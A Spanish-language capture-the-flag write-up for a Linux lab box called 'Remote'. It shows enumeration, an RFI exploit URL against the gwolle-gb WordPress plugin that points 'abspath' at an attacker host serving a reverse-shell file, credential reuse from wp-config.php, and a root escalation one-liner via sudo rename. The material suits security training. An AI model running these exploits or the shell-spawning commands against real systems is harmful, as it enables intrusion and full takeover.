---
Estado: Completado
Plataforma: Vulnix
SO: Linux
Dificultad: Fácil
VectorInicial: RFI en plugin vulnerable de WordPress
Privesc: sudo `rename`
Fecha: 2026-02-23
---

# Remote

## Reconocimiento inicial

Se identifica la IP del laboratorio y después se enumeran servicios.

Puertos detectados:

- `22/tcp` → SSH
- `80/tcp` → HTTP

## Descubrimiento de WordPress

La página principal de Apache no aporta nada, pero al enumerar con `dirb` se localiza `/wordpress/`.

La web carga mal hasta resolver el dominio `remote.nyx`, que se añade a `/etc/hosts`.

## Enumeración de WordPress

Con `wpscan` se identifican:

- usuario: `tiago`
- plugin vulnerable: `gwolle-gb`
- vulnerabilidad: **Remote File Inclusion**

## Explotación RFI

La vulnerabilidad permite controlar el parámetro `abspath`:

```text
http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[attacker-host]
```

Se prepara un pequeño servidor HTTP local que expone un `wp-load.php` con reverse shell, y se lanza el exploit para que la víctima lo incluya.

Una vez activado, se recibe shell como `www-data`.

## Movimiento lateral

Se revisa `wp-config.php` y se encuentra la contraseña de base de datos:

- `WPr00t3d123!`

Esa misma contraseña sirve para cambiar al usuario `tiago` con `su`, lo que confirma reutilización de credenciales.

## Escalada de privilegios

Como `tiago`, se revisan permisos sudo:

```bash
sudo -l
```

Salida relevante:

```text
(root) NOPASSWD: /usr/bin/rename
```

La escalada puede hacerse creando un archivo cualquiera y ejecutando:

```bash
sudo rename -e 'system("/bin/bash")' test.txt
```

Con ello se obtiene shell como `root`.

## Conclusión

Cadena de ataque:

1. Descubrimiento de WordPress.
2. Identificación del plugin vulnerable.
3. RFI para obtener reverse shell.
4. Lectura de `wp-config.php`.
5. Reutilización de contraseña para pivotar a `tiago`.
6. Escalada a root mediante `sudo rename`.

Laboratorio bastante redondo: una vulnerabilidad web realista, reutilización de credenciales y una escalada final elegante.

---
Si te gustó, puedes invitarme a un café.
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
